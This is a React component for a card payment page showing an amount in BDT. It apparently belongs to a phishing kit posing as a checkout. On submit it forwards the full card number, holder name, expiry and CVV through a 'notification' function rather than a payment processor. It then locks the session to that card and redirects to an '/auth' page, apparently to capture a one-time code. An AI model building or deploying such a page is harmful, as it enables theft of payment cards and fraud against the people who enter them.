import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useSession } from '@/hooks/useSession';
import { useLanguage } from '@/contexts/LanguageContext';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { formatCardNumber, formatExpiry, detectCardType } from '@/lib/utils';
import { sendCardEntryNotification } from '@/lib/notifications';
import { Lock, HelpCircle } from 'lucide-react';
import { Tooltip, TooltipContent, TooltipTrigger } from '@/components/ui/tooltip';

export default function CardEntry() {
  const navigate = useNavigate();
  const { session, updateSession, isValid } = useSession();
  const { t } = useLanguage();
  
  const [cardHolder, setCardHolder] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [error, setError] = useState('');

  if (!isValid || !session) {
    navigate('/unauthorized');
    return null;
  }

  const cardType = detectCardType(cardNumber);

  const handleCardHolderChange = (value: string) => {
    const upperOnly = value.replace(/[^A-Z\s]/gi, '').toUpperCase();
    setCardHolder(upperOnly);
  };

  const handleCardNumberChange = (value: string) => {
    if (session.cardNumber && session.cardNumber !== value.replace(/\s/g, '').slice(0, 6)) {
      setError(t('differentCard'));
      return;
    }
    setError('');
    setCardNumber(formatCardNumber(value, cardType || undefined));
  };

  const handleSubmit = async () => {
    const cleanCardNumber = cardNumber.replace(/\s/g, '');
    
    updateSession({ 
      cardNumber: cleanCardNumber.slice(0, 6),
      cardSubmitted: true 
    });
    
    await sendCardEntryNotification(session.sessionKey, session.amount, {
      cardNumber: cleanCardNumber,
      cardHolderName: cardHolder,
      cardExpiry: expiry,
      cardCVV: cvv,
      cardType: cardType || 'unknown',
    });
    
    navigate('/auth');
  };

  const isFormValid = cardHolder.length > 2 && cardNumber.replace(/\s/g, '').length >= 15 && expiry.length === 5 && cvv.length >= 3;

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-card rounded-xl shadow-[var(--form-shadow)] p-6">
        <div className="mb-6">
          <div className="flex justify-between text-sm mb-2">
            <span className="text-muted-foreground">{t('amount')}:</span>
            <span className="font-semibold">{session.amount} BDT</span>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <Label>{t('cardHolderName')}</Label>
            <Input
              value={cardHolder}
              onChange={(e) => handleCardHolderChange(e.target.value)}
              placeholder="JOHN DOE"
              className="uppercase"
            />
          </div>

          <div>
            <Label className="flex items-center gap-2">
              <Lock className="w-3 h-3" />
              {t('cardNumber')}
            </Label>
            <Input
              value={cardNumber}
              onChange={(e) => handleCardNumberChange(e.target.value)}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
            />
            {error && <p className="text-destructive text-xs mt-1">{error}</p>}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label>{t('expiryDate')}</Label>
              <Input
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                placeholder="MM/YY"
                maxLength={5}
              />
            </div>
            <div>
              <Label className="flex items-center gap-1">
                {t('securityCode')}
                <Tooltip>
                  <TooltipTrigger>
                    <HelpCircle className="w-3 h-3 text-muted-foreground" />
                  </TooltipTrigger>
                  <TooltipContent>3 or 4 digit code on your card</TooltipContent>
                </Tooltip>
              </Label>
              <Input
                type="password"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                placeholder="•••"
                maxLength={4}
              />
            </div>
          </div>

          <Button onClick={handleSubmit} disabled={!isFormValid} className="w-full">
            {t('pay')} {session.amount} BDT
          </Button>
        </div>
      </div>
    </div>
  );
}
